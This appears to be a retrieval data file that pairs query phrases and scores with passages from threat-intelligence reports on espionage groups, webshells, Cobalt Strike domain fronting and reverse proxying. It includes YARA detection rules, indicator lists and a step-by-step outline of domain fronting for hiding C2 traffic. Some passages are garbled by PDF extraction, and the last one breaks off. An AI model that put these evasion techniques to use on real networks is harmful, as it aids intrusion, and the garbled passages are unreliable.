anti-virus software information|0.7604498330960682|"['Description Cyber threat actors are using an SMB worm to conduct cyber exploitation activities.', 'This tool contains five components a listening implant, lightweight backdoor, proxy tool, destructive hard drive tool, and destructive target cleaning tool.', 'The SMB worm propagates throughout an infected network via brute-force authentication attacks, and connects to a C2 infrastructure.', 'Impact Due to the highly destructive functionality of this malware, an organization infected could experience operational impacts including loss of intellectual property and disruption of critical systems.', 'Solution Users and administrators are recommended to take the following preventive measures to protect their computer networks: Use and maintain anti-virus software Anti-virus software recognizes and protects your computer against most known viruses.', 'It is important to keep your anti-virus software up-to-date (see Understanding Anti-Virus Software for more information).', ""Keep your operating system and application software up-to-date Install software patches so that attackers can't take advantage of known problems or vulnerabilities."", 'Many operating systems offer automatic updates.', 'If this option is available, you should enable it (see Understanding Patches for more information).', 'Review Security Tip Handling Destructive Malware #ST13-003 and evaluate their capabilities encompassing planning, preparation, detection, and response for such an event.', 'Review Recommended Practices for Control Systems, and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies (pdf).']"
anti-virus software information|0.8115292297130505|['Hosts file: Retrieve and send / etc/hosts file contents.', 'Installed Software: Exfiltrate details of installed software from registry.', 'Execution: Run arbitrary commands on the endpoint via cmd.exe.', 'Clipboard: Get and set clipboard data.', 'Sysinfo: The following informa- tion is sent to the C2 to finger- print the endpoint: IP and MAC addresses.', 'Installed anti-virus software.', 'Processor and GPU info, RAM info, system uptime, OS details, battery charge and life.', 'Figure 9: DetaRAT command codes.', 'Hostname, current username and screen dimensions.', '2021 Cisco.', 'All rights reserved.']
decrypting,|0.8073402965648736|['Every multiple APT groups operate under, or are resourced by, the ShadowPad sample that we have seen has a root module same digital quartermaster cannot be ruled out for various designed to orchestrate the next set of modules, including a sets of threat actors.', 'In 2021, we continued to observe plugins module that can then be customised depending on this phenomenon, whether through observations of shared the functionality that the threat actor requires.', 'The plugins capability (malware, techniques, exploits, and so on), or can enable capabilities that may include, among others, C2 through overlaps in infrastructure (either through the same communications over HTTP or TCP, keylogging, screenshot patterns observed on C2s, or the reuse of domains/IPs by gathering, port mapping, and system information gathering.6 other threat actors).', 'In tracking standard ShadowPad samples in 2021, Of Shadows and Proxies: China-based threat actors we identified and analysed a new variant, which we sharing tools call ScatterBee: samples of ShadowPad that had been The continued sharing of tools and techniques is a running obfuscated using a custom technique.7 Likely in order to theme among China-based threat actors.', 'While not all of the minimise detection on victim networks, the ScatterBee China-based threat actors share tools with one another, and packing mechanism implements control flow obfuscation, not all of them have access to the same tools, quartermaster string encoding, dynamic API resolutions, several anti- arrangements (covered in more detail in a later section) analysis techniques, as well as shellcode decoding/ continue to complicate attribution of activity.', 'For example, decrypting.', 'We assess that one or more users of ShadowPad the same malware families (such as PlugX, PoisonIvy, have access to ScatterBee, and have highly likely delivered ShadowPad, Quarian, and the Winnti backdoor) are used by some of these malicious payloads via watering hole attacks multiple China-based threat actors, and, as has become very on sites that are used to deliver Adobe Flash update files.', 'We well known in 2021 with the ProxyLogon incidents, some assess that most ScatterBee payloads can be directly linked threat actors share exploits as well.', 'back to the threat actor we track as Red Dev 10 (aka Earth Lusca), and have been used to target organisations in the We note that while not all of these threat actors have been aerospace and defence sectors.', 'observed having access to the shared tools detailed below, these are prime examples of the dynamic We assess ShadowPad to be highly likely used by at least described in this section.', '11 China-based threat actors.8 Our analysis into specific subsets of ShadowPad infrastructure allowed us to identify a wide set of victims, ranging from India-based entities in the telecommunications and oil and gas sectors, to East Asian branches of international humanitarian organisations.7P w PCw CCy Cbyebr eTrh Treharetsa t2s0 22012: 1A: YAe Yaer ainr iRne Rtreotsropsepcetct Figure 1: Geographic distribution of ShadowPad victims observed until December 2021 Source: PwC Exchanging Exchange: ProxyLogon a set of malicious PDF documents targeting the higher In early 2021, Red Dev 13 (aka HAFNIUM) began exploiting education sector.']
"The operators made a consistent effort to
delete these tools and remove any residual forensic artifacts from
compromised systems."|1.0|['During this time, UNC215 used new TTPs to hinder attribution and detection, maintain operational security, employ false flags, and leverage trusted relationships for lateral movement.', 'We believe this adversary is still active in the region.', 'Attack Lifecycle Between 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shells, and then FOCUSFJORD payloads to select government and academic targets in the Middle East and Central Asia.', 'After gaining initial access, the operators conduct credential harvesting and extensive internal network reconnaissance.', 'This includes running native Windows commands on compromised servers, executing ADFind on the Active Directory, and scanning the internal network with numerous publicly available tools and a non-public scanner we named WHEATSCAN.', 'The operators made a consistent effort to delete these tools and remove any residual forensic artifacts from compromised systems.', 'In another incident response investigation, UNC215 pivoted to multiple OWA servers and installed web shells.', 'In the following days, the operators interacted with these web shells from internal IP addresses, attempting to harvest credentials.', 'After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.', 'UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information collection capabilities such as screen capture and keylogging.', 'While UNC215 heavily relies on the custom tools FOCUSFJORD and HYPERBRO, Chinese espionage groups often have resource sharing relationships with other groups, and we do not have enough information to determine if these tools are developed and used exclusively by UNC215.']
"consistently cleaned up evidence of their intrusion after
gaining access to a system"|0.7677811228374964|"['In the following days, the operators interacted with these web shells from internal IP addresses, attempting to harvest credentials.', 'After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.', 'UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information collection capabilities such as screen capture and keylogging.', 'While UNC215 heavily relies on the custom tools FOCUSFJORD and HYPERBRO, Chinese espionage groups often have resource sharing relationships with other groups, and we do not have enough information to determine if these tools are developed and used exclusively by UNC215.', 'https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 1/158/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 2/158/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc Figure 1: Attack Lifecycle Tradecraft and Operational Security We identified numerous examples of efforts by UNC215 to foil network defenders by minimizing forensic evidence left on compromised hosts, exploiting relationships with trusted third parties, continuously improving the FOCUSFJORD backdoor, concealing command and control (C2) infrastructure, and incorporating false flags.', 'Reducing Forensic Evidence on Disk UNC215 consistently cleaned up evidence of their intrusion after gaining access to a system.', 'This type of action can make it more difficult for incident responders to reconstruct what happened during a compromise.', 'The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.', 'The first FOCUSFJORD payload delivered to a system contains a blob that includes C2 and other configuration data.', 'On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the systems registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.', 'This process enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scanning services.']"
"to delete any remaining FOCUSFJORD
forensic evidence, including files on disk, configuration data
encrypted in the registry, and related services and registry keys
used for persistence."|0.90396783732652|"['The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.', 'The first FOCUSFJORD payload delivered to a system contains a blob that includes C2 and other configuration data.', 'On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the systems registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.', 'This process enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scanning services.', 'A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.', 'The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence.', 'Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.', 'As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target.', 'https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 3/158/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 4/158/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc Figure 2: Two FOCUSFJORD samples configured to proxy C2 traffic Concealing C2 Infrastructure UNC215 made technical modifications to their tools to limit outbound network traffic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network traffic.', 'The following are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay communications to their C2 servers.', 'We do not have enough context about the following samples to attribute all of them to UNC215, though they are representative of activity we have seen from the group.']"
"operators were able to access their primary target via RDP connections
from a trusted third party using stolen credentials"|0.7838000867059458|"['On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the systems registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.', 'This process enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scanning services.', 'A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.', 'The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence.', 'Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.', 'As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target.', 'https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 3/158/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 4/158/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc Figure 2: Two FOCUSFJORD samples configured to proxy C2 traffic Concealing C2 Infrastructure UNC215 made technical modifications to their tools to limit outbound network traffic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network traffic.', 'The following are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay communications to their C2 servers.', 'We do not have enough context about the following samples to attribute all of them to UNC215, though they are representative of activity we have seen from the group.', 'HYPERBRO samples MD5: 0ec4d0a477ba21bda9a96d8f360a6848 and MD5: 04dece2662f648f619d9c0377a7ba7c0 have embedded configurations of internal IP addresses (192.168.1.237 and 192.168.4.26 respectively) as C2 servers.', 'If they receive a command with an IP address and port, they will connect and relay the command.']"
"to obfuscate the source of the
activity."|0.7665346143878506|"['Permission Groups Discovery: The actor attempt to find local system T1069.001 Local Groups groups and permission settings.', 'Permission Groups Discovery: The actor used commands to enumerate T1069.002 Doman Groups the active directory structure.', 'System Network Configuration The actor used commands to enumerate T1016 Discovery the network topology.', 'Command and Control The actor used commands to enable port Proxy T1090 forwarding on the host.', 'The actor used compromised SOHO Proxy: External Proxy T1090.002 devices (e.g.', 'routers) to obfuscate the source of their activity.', 'TLP:CLEAR U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver.', '1.1 24']"
"to obfuscate the source of the
activity."|0.7665346143878506|"['""$s5 = ""aes.encrypt(allStr)""$s6 = ""newid""condition:filesize < 50KB and 4 of them}rule EncryptJSP {strings:$s1 = ""AEScrypt""$s2 = ""AES/CBC/PKCS5Padding""$s3 = ""SecretKeySpec""$s4 = ""FileOutputStream""$s5 = ""getParameter""$s6 = ""new ProcessBuilder""$s7 = ""new BufferedReader""$s8 = ""readLine()""condition:filesize < 50KB and 6 of them}rule CustomFRPClient {meta:description=Identify instances of the actor\'s custom FRP tool basedon unique strings chosen by the actor and included in the toolstrings:$s1 = ""%!PS-Adobe-"" nocase ascii wide$s2 = ""github.com/fatedier/frp/cmd/frpc"" nocase ascii wide$s3 = ""github.com/fatedier/frp/cmd/frpc/sub.startService"" nocaseascii wide$s4 = ""MAGA2024!!!""', 'nocase ascii wide$s5 = ""HTTP_PROXYHost: %s"" nocase ascii widecondition:all of them}rule HACKTOOL_FRPClient {meta:description=Identify instances of FRP tool (Note: This tool isknown to be used by multiple actors, so hits would not necessarily implyactivity by the specific actor described in this report)strings:$s1 = ""%!PS-Adobe-"" nocase ascii wide$s2 = ""github.com/fatedier/frp/cmd/frpc"" nocase ascii wide$s3 = ""github.com/fatedier/frp/cmd/frpc/sub.startService"" nocaseascii wide$s4 = ""HTTP_PROXYHost: %s"" nocase ascii widecondition:3 of them}ReferencesActive Directory and domain controller hardening:CISA regional cyber threats:Microsoft Threat Intelligence blog:Ntdsutil.exe:PowerShell:Windows command line process auditing:Windows Defender Firewall:Windows management instrumentation:Windows password spraying:AcknowledgementsThe NSA Cybersecurity Collaboration Center, along with the authoring agencies, acknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google\'s Threat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence (MSTI), Palo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry partners for their collaboration on this advisory.Disclaimer of EndorsementThe information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees.', ""Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or favoring by the authoring agencies' governments, and this guidance shall not be used for advertising or product endorsement purposes.Trademark RecognitionActive Directory, Microsoft, PowerShell, and Windowsare registered trademarks of Microsoft Corporation.MITREand ATT&CKare registered trademarks of The MITRE Corporation.PurposeThis document was developed in furtherance of the authoring agencies cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations."", 'This information may be shared broadly to reach all appropriate stakeholders.ContactU.S.', 'organizations:Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA atReport@cisa.dhs.govorcisa.gov/reportor to the FBI via your local FBI field office listed athttps://www.fbi.gov/contact-us/field-offices.NSA Cybersecurity Report Questions and Feedback:CybersecurityReports@nsa.govNSA Defense Industrial Base Inquiries and Cybersecurity Services:DIB_Defense@cyber.nsa.govNSA Media Inquiries / Press Desk: 443-634-0721,MediaRelations@nsa.govAustralian organizations:Visitcyber.gov.auor call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and to access alerts and advisories.Canadian organizations:Report incidents by emailing CCCS atcontact@cyber.gc.ca.New Zealand organizations:Report cyber security incidents toincidents@ncsc.govt.nzor call 04 498 7654.United Kingdom organizations:Report a significant cyber security incident atncsc.gov.uk/report-an-incident(monitored 24 hours) or, for urgent assistance, call 03000 200 973.Appendix: MITRE ATT&CK TechniquesThe below tables capture all referenced threat actor tactics and techniques in this advisory.Initial AccessTechnique TitleIDUseExploit Public-facing ApplicationT1190Actor used public-facing applications to gain initial access to systems; in this case, Earthworm and PortProxy.ExecutionTechnique TitleIDUseWindows Management InstrumentationT1047The actor executed WMIC commands to create a copy of the SYSTEM registry.Command and Scripting Interpreter: PowerShellT1059.001The actor used a PowerShell command to identify successful logons to the host.Command and Scripting Interpreter: Windows Command ShellT1059.003The actor used this primary command prompt to execute a query that collected information about the storage devices on the local host.PersistenceTechnique TitleIDUseServer Software Component: Web ShellT1505.003The actor used backdoor web servers with web shells to establish persistence to systems, including some of the webshells being derived fromAwenwebshell.Defense EvasionTechnique TitleIDUseIndicator RemovalT1070The actor selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity.Indicator Removal: Clear Windows Event LogsT1070.001The actor cleared system event logs to hide activity of an intrusion.Credential AccessTechnique TitleIDUseOS Credential Dumping: NTDST1003.003The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive out of the network to perform password cracking.Brute ForceT1110The actor attempted to gain access to accounts with multiple password attempts.Brute Force: Password SprayingT1110.003The actor used commonly used passwords against accounts to attempt to acquire valid credentials.OS Credential DumpingT1003The actor used additional commands to obtain credentials in the environment.Credentials from Password StoresT1555The actors searched for common password storage locations.DiscoveryTechnique TitleIDUseSystem Information DiscoveryT1082The actors executed commands to gather information about local drives.System Owner/User DiscoveryT1033The actors gathered information about successful logons to the host using a PowerShell command.Permission Groups Discovery: Local GroupsT1069.001The actors attempt to find local system groups and permission settings.Permission Groups Discovery: Doman GroupsT1069.002The actors used commands to enumerate the active directory structure.System Network Configuration DiscoveryT1016The actors used commands to enumerate the network topology.Command and ControlTechnique TitleIDUseProxyT1090The actors used commands to enable port forwarding on the host.Proxy: External ProxyT1090.002The actors used compromised SOHO devices (e.g.', 'routers) to obfuscate the source of their activity.']"
and IP address|0.8047708902366468|['The actor used the search functionality within Outlook Web App to search for email addresses, including searching for the domain name of the compromised Kuwaiti organization to get a full list of email addresses, as well as specific keywords, such as helpdesk.', 'We also saw the actor viewing emails in the compromised accounts inbox, specifically emails from service providers and technology vendors.', 'Additionally, the actor viewed alert emails from a Symantec product and Fortinets FortiWeb product.', 'The act of searching for emails to the helpdesk and viewing security alert emails suggests that the threat actor was interested in determining whether the Kuwaiti organization had become aware of the malicious activities.', 'In regard to the BumbleBee webshell activity, the important pieces of information in the IIS logs used to generate a timeline were: Timestamp of the HTTP requests.', 'Actors IP address.', 'User-agent in HTTP request provides the actors operating system and browser version.', 'ClientId in the URL parameters is a unique identifier for the client provided by the Exchange server via a server-side cookie.', 'Table 1 in the Appendix provides the timeline of activity regarding the actors use of the BumbleBee webshell, which began on Feb. 1, 2020, according to the logs we were able to collect.', 'While creating this timeline, we noticed a few interesting observables and behaviors exhibited by the actor when interacting with BumbleBee, including: All but one of the IP addresses used by the actor are associated with a VPN provided by Private Internet Access, with the other IP address belonging to FalcoVPN.', 'The actor switched between VPN servers in different locations to change IP address and to appear to originate from different countries, specifically Belgium, Germany, Ireland, Italy, Luxembourg, the Netherlands, Poland, Portugal, Sweden and the United Kingdom.']
and IP address|0.8047708902366468|['The actor used the search functionality within Outlook Web App to search for email addresses, including searching for the domain name of the compromised Kuwaiti organization to get a full list of email addresses, as well as specific keywords, such as helpdesk.', 'We also saw the actor viewing emails in the compromised accounts inbox, specifically emails from service providers and technology vendors.', 'Additionally, the actor viewed alert emails from a Symantec product and Fortinets FortiWeb product.', 'The act of searching for emails to the helpdesk and viewing security alert emails suggests that the threat actor was interested in determining whether the Kuwaiti organization had become aware of the malicious activities.', 'In regard to the BumbleBee webshell activity, the important pieces of information in the IIS logs used to generate a timeline were: Timestamp of the HTTP requests.', 'Actors IP address.', 'User-agent in HTTP request provides the actors operating system and browser version.', 'ClientId in the URL parameters is a unique identifier for the client provided by the Exchange server via a server-side cookie.', 'Table 1 in the Appendix provides the timeline of activity regarding the actors use of the BumbleBee webshell, which began on Feb. 1, 2020, according to the logs we were able to collect.', 'While creating this timeline, we noticed a few interesting observables and behaviors exhibited by the actor when 4/18interacting with BumbleBee, including: All but one of the IP addresses used by the actor are associated with a VPN provided by Private Internet Access, with the other IP address belonging to FalcoVPN.', 'The actor switched between VPN servers in different locations to change IP address and to appear to originate from different countries, specifically Belgium, Germany, Ireland, Italy, Luxembourg, the Netherlands, Poland, Portugal, Sweden and the United Kingdom.']
and IP address|0.7530413424147278|[]
and IP address|0.9617175138536276|['19 Corelan Team.', 'Starting to write Immunity Debugger PyCommands : my cheatsheet.', 'January 2010.', '10 www.fireeye.comPoison Ivy: Assessing Damage and Extracting Intelligence Defenders View Attackers View Starting ChopShop Initializing Modules ... Initializing module poisonivy_23x Transferred files will be saved.. Screen/Cam/Audio/Key captures will be saved.. Running Modules ... [2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]*** Host Information*** PI profile ID: mal IP address: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 2600 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] *** Shell Session *** Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\\\> [2013-07-03 06:46:42 PDT] *** Shell Session *** ipconfig [2013-07-03 06:46:43 PDT] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .', ': IP Address.', '.', '.', '.', '.', '.', '.']
and IP address|0.9617175138536276|"['In addition, several other clues also pointed to Indonesia.', 'Administrator nicknames.', 'The admin nicknames when used to configure this botnet may provide possible attribution information.', 'Preman, one of the monikers used, is a word for an Indonesian gangster and, according to Wikipedia, is a member of an organized crime group.9 When connecting to the C&C development environment, the Indonesian phrase ""assalamualaikum pak aji"" appears.', 'It does not appear on the main C&C.', 'IP address.', 'As investigations into this bot continued, the new version had an interesting IP address that exposed the threat actors development environment.', 'The threat actor runs this development environment to test new versions of the Perl script.', 'After the admins nicknames were registered we continued to monitor activity from both the main and development IRC servers.', 'In the development IRC server, admin nicknames were not registered and there was an additional https://www.f5.com/labs/articles/threat-intelligence/new-perl-botnet--tuyul--found-with-possible-indonesian-attributi 8/142/1/2021 New Perl Botnet (Tuyul) Found with Possible Indonesian Attribution clue to the threat actors origin, including the use of the phrase assalamualaikum pak aji, which translates to greetings sir Aji.', 'According to names.org, the name Aji may have many originsone of the common ones is from Indonesia and means bless.10 Figure 20.']"
and IP address|0.7833393252162436|['We hope that the information contained within this report will help defenders thwart this group in the future.', 'Wed like to extend a special thank you to all the victims, targets, researchers, and security vendors who have shared their own findings over the years.', '16Appendix A: Associated Indicators If you are interested in automating the intake of public 401TRG indicators, we recommend using our g ithub detections repository.', 'Area #1: Type Indicator IP Address 106.184.5.252 IP Address 106.185.31.128 IP Address 106.186.122.96 IP Address 13.115.93.210 IP Address 133.242.145.137 IP Address 139.162.106.19 IP Address 139.162.119.48 IP Address 139.162.17.161 IP Address 139.162.79.40 IP Address 139.162.95.39 IP Address 159.65.71.30 IP Address 172.104.101.131 IP Address 172.104.115.124 IP Address 198.199.78.207 IP Address 207.126.114.154 IP Address 45.32.18.187 IP Address 45.77.179.192 IP Address 52.199.202.13 IP Address 61.78.62.102 IP Address 61.78.62.21 IP Address 61.78.62.61 17Domain 11116[.]intra[.]applestunes[.', ']com Domain 24287[.]intra[.]applestunes[.', ']com Domain 26707[.]intra[.]applestunes[.', ']com Domain 33604[.]intra[.]applestunes[.', ']com Domain account[.]microsoftssonline[.', ']com Domain account[.]micrrosoftsonline[.', ']com Domain account[.]outlook-s[.', ']com Domain accounts[.]gmail[.]sa[.']
Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic|0.9755480485649834|"['Another example is the jquery-3.3.1.min.jswhich is associated withthismalleable C2 profile as we observed infour intrusions.+----------------------+-----------------------+ | C2 Server      | URI queried     | +----------------------+-----------------------+ | gawocag.com     | /nd          | | 190.114.254.116   | /push         | | 190.114.254.116   | /__utm.gif      | | kaslose.com     | /jquery-3.3.1.min.js | | yawero.com      | /skin.js       | | sazoya.com      | /skin.js       | | 192.198.86.130    | /skin.js       | | 162.244.83.216    | /jquery-3.3.1.min.js | | sammitng.com     | /jquery-3.3.1.min.js | | 23.19.227.147    | /styles.html     | | securityupdateav.com | /tab_shop_active.html | | 108.62.118.247    | /as          | | windowsupdatesc.com | /as          | | 212.114.52.180    | /copyright.css    | | defenderupdateav.com | /default.css     | | onlineworkercz[.', ']com | /kj          | | checkauj.com     | /jquery-3.3.1.min.js | +----------------------+-----------------------+A deep dive into all available fields can be found onthis postfrom@ZephrFish.', 'He also includes other fields related to post-exploitation beacon configuration along with network communication-related fields.', 'Another great resource isthis articlereleased by SpecterOps.Domain FrontingThe main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.', 'It essentially masks your traffic to a certain website by masquerading it as a different domain.This technique is possible thanks to Content Delivery Networks (CDNs).', 'Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).', 'In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.', 'Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strikepagethat discusses this technique.Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.', 'The following prerequisites must be met in order for domain fronting to be possible:Own a domain.', '(e.g.,infosecppl.store)Pick one of the many web services that provide CDN capabilities.', '(e.g.,cloudfront.net).Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.']"
attackers have started using this technique to hide their malicious infrastructure behind legitimate domains|0.908068062321767|"[']com | /kj          | | checkauj.com     | /jquery-3.3.1.min.js | +----------------------+-----------------------+A deep dive into all available fields can be found onthis postfrom@ZephrFish.', 'He also includes other fields related to post-exploitation beacon configuration along with network communication-related fields.', 'Another great resource isthis articlereleased by SpecterOps.Domain FrontingThe main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.', 'It essentially masks your traffic to a certain website by masquerading it as a different domain.This technique is possible thanks to Content Delivery Networks (CDNs).', 'Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).', 'In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.', 'Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strikepagethat discusses this technique.Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.', 'The following prerequisites must be met in order for domain fronting to be possible:Own a domain.', '(e.g.,infosecppl.store)Pick one of the many web services that provide CDN capabilities.', '(e.g.,cloudfront.net).Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.', '(e.g.,l33th4x0r.cloudfront.net).Setup a profile to facilitate domain fronting.Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource.Step five is where things get interesting.']"
Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.|0.908587811037043|['Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).', 'In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.', 'Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strikepagethat discusses this technique.Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.', 'The following prerequisites must be met in order for domain fronting to be possible:Own a domain.', '(e.g.,infosecppl.store)Pick one of the many web services that provide CDN capabilities.', '(e.g.,cloudfront.net).Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.', '(e.g.,l33th4x0r.cloudfront.net).Setup a profile to facilitate domain fronting.Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource.Step five is where things get interesting.', 'Attackers can use legitimate domains that are registered under the same CDN provider.', 'As demonstrated in the screenshot above, all they have to do is include their CDN endpoint domain (created in step three) in the host header of the request.', 'In that way, the legitimate website will forward the traffic through the CDN to the original destination according to the host header.In the screenshots below, you can see how the malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs:This researchpaperreleased by academics from the University of California, Berkeley, is a great introduction to domain fronting.', 'This paper inspired many researchers to expand the possibilities of this unique way of hiding the final destination server on web traffic.']
domain fronting|0.8898804712386492|['SilverFish Group Threat Actor ReportTLP:WHITE SilverFishAPTGroup Contents References 2 1 Introduction 3 1.1 InvestigationTimeline .', '.', '.', '.', '.', '.', '.']
domain fronting|0.8898804712386492|['SilverFish Group Threat Actor ReportTLP:WHITE SilverFishAPTGroup Contents References 2 1 Introduction 3 1.1 InvestigationTimeline .', '.', '.', '.', '.', '.', '.']
Attackers can use legitimate domains that are registered under the same CDN provider.|1.0|['Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strikepagethat discusses this technique.Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.', 'The following prerequisites must be met in order for domain fronting to be possible:Own a domain.', '(e.g.,infosecppl.store)Pick one of the many web services that provide CDN capabilities.', '(e.g.,cloudfront.net).Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.', '(e.g.,l33th4x0r.cloudfront.net).Setup a profile to facilitate domain fronting.Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource.Step five is where things get interesting.', 'Attackers can use legitimate domains that are registered under the same CDN provider.', 'As demonstrated in the screenshot above, all they have to do is include their CDN endpoint domain (created in step three) in the host header of the request.', 'In that way, the legitimate website will forward the traffic through the CDN to the original destination according to the host header.In the screenshots below, you can see how the malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs:This researchpaperreleased by academics from the University of California, Berkeley, is a great introduction to domain fronting.', 'This paper inspired many researchers to expand the possibilities of this unique way of hiding the final destination server on web traffic.', 'One of those researchers isVincentwho wrote a greatarticleon domain fronting.', 'He explains in simple terms how it works.']
threat actors use their beacon sessions to establish RDP access|0.760534015536731|['He also published aPythonscript to identify possible domains that can be leveraged for domain fronting.Looking into our reporting, we dont see many instances of domain fronting.', 'This is most likely due to the complex process of setting up the necessary infrastructure.', 'Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.', 'According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin.The data above is available via our services.', 'More information on this service and others can be foundhere.Reverse Proxy using Cobalt Strike BeaconA technique that we come across often is a reverse proxy.', 'We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.', 'Cobalt Strike has the ability to run a SOCKS proxy server on the team server.', 'This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.', 'The screenshot below demonstrates this implementation.Image credit:cobaltstrike.comSome of the cases we have observed threat actors using reverse proxy are:In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.', 'There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted.Below, we demonstrate how attackers take advantage of this technique usingproxychainsfrom the attackers kali Linux host.', 'In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server.Creating the listening port (TCP port 8888)In this second image, we employ proxychains from the attackers Kali Linux host to RDP into 